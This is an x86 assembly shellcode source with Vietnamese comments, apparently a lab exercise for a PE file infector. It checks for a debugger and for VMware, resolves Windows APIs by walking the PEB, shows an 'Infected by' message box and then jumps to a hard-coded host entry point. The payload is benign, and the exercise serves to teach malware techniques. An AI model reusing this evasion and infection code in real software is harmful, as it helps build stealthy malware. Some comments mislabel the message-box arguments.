global _start

section .text
_start:

checkDebugger:
	mov eax, [fs:0x18]
	mov eax, [eax + 0x30]
	cmp dword [eax + 0x68], 0x70
	jz Detected

checkVM:
	xor eax, eax
	mov eax, 0x40000000
	cpuid
	cmp ecx, 0x4D566572         ; 'MVer'
	jne getKernel32
	cmp edx, 0x65726177         ; 'eraw'
	jne getKernel32
	mov edi, 1

getKernel32:
	xor ecx, ecx                ; làm trống thanh ghi ECX
	mul ecx                     ; làm trống thanh ghi EAX EDX
	mov eax, [fs:0x18]			; TEB được load vào eax
	mov eax, [fs:ecx + 0x30]    ; PEB được load vào eax
	mov eax, [eax + 0xc]        ; LDR được load vào eax
	mov esi, [eax + 0x14]       ; InMemoryOrderModuleList được load vào esi
	lodsd                       ; địa chỉ program.exe được load vào eax (1st module)
	xchg esi, eax				
	lodsd                       ; địa chỉ ntdll.dll được load (2nd module)
	mov ebx, [eax + 0x10]       ; địa chỉ kernel32.dll được load vào ebx (3rd module)

getAddressofName:
	mov edx, [ebx + 0x3c]       ; load địa chỉ e_lfanew vào ebx
	add edx, ebx				
	mov edx, [edx + 0x78]       ; load data directory
	add edx, ebx
	mov esi, [edx + 0x20]       ; load "address of name"
	add esi, ebx
	xor ecx, ecx

	; ESI = RVAs

getProcAddress:
	inc ecx                             ; ordinals increment
	lodsd                               ; get "address of name" vào eax
	add eax, ebx				
	cmp dword [eax], 0x50746547         ; GetP
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72   ; rocA
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464   ; ddre
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]       ; offset ordinals
	add esi, ebx                ; trỏ đến name ordinals table
	mov cx, [esi + ecx * 2]     ; CX = Số lượng function
	dec ecx
	mov esi, [edx + 0x1c]       ; ESI = Offset address table
	add esi, ebx                
	mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
	add edx, ebx                ; EDX = getProcAddress
	mov ebp, edx                ; lưu getProcAddress vào EBP để sử dụng sau này

getLoadLibraryA:
	xor ecx, ecx                ; làm trống ecx
	push ecx                    ; push 0 vào stack
	push 0x41797261             ; 
	push 0x7262694c             ;  AyrarbiLdaoL
	push 0x64616f4c             ;
	push esp
	push ebx                    ; kernel32.dll
	call edx                    ; call GetProcAddress và tìm địa chỉ LoadLibraryA

	; EAX = LoadLibraryA address
	; EBX = Kernel32.dll address
	; EDX = GetProcAddress address 

getUser32:
	push 0x61616c6c                 ;
	sub word [esp + 0x2], 0x6161    ; aalld.23resU
	push 0x642e3233                 ; 
	push 0x72657355                 ; 
	push esp
	call eax                        ; call Loadlibrary and load User32.dll
	
	; EAX = User32.dll address
	; EBX = Kernel32.dll address
	; EBP = GetProcAddress address 

getMessageBox:
	push 0x6141786f                 ; aAxo : 6141786f
	sub word [esp + 0x3], 0x61
	push 0x42656761                 ; Bega : 42656761
	push 0x7373654d	                ; sseM : 7373654d
	push esp
	push eax                        ; User32.dll
	call ebp                        ; GetProcAddress(User32.dll, MessageBoxA)
	cmp edi, 1
	je Crash
	; EAX User32.MessageBoxA
	; ECX OFFSET User32.#2499
	; EBX kernel32.75290000
	; ESP ASCII "32.dll"
	; EBP kernel32.GetProcAddress
	; ESI kernel32.75344DD0
	; EDI 00000000
	; EIP getMessa.004010A4

MessageBoxA:
	add esp, 0x10                  ; clean the stack
	xor edx, edx
	xor ecx, ecx
	xor edi, edi
    push edx 						
    push ' by'
	push 'cted'
	push 'Infe'
    mov edi, esp
    push edx
    push '0560'
	push '1852'
    mov ecx, esp
	push 0x40                       ; hWnd = MB_ICONINFORMATION
	push edi                        ; the title "Infected by"
	push ecx                        ; the message "18520560"
	push edx                        ; uType = NULL
	call eax                        ; MessageBoxA(windowhandle,msg,title,type)
	mov eax, 0x475930
	call eax

Exit:
	add esp, 0x10               ; clean the stack
	push 0x61737365             ; asse
	sub word [esp + 0x3], 0x61  ; asse -a 
	push 0x636F7250	            ; corP
	push 0x74697845             ; tixE
	push esp
	push ebx
	call ebp

	xor ecx, ecx
	push ecx
	call eax

Crash:
	add esp, 0x10                  ; clean the stack
	xor edx, edx
	xor ecx, ecx
	xor edi, edi
    push edx 						
    push 'Hmmm'
    mov edi, esp
    push edx
	push 'h!'
	push 'Cras'
    mov ecx, esp
	push 0x10                       ; hWnd = MB_ICONSTOP
	push edi                        ; the title "Hmmm"
	push ecx                        ; the message "Crash!"
	push edx                        ; uType = NULL
	call eax                        ; MessageBoxA(windowhandle,msg,title,type)
	jmp Exit

Detected:
	mov edi, 1
	jmp getKernel32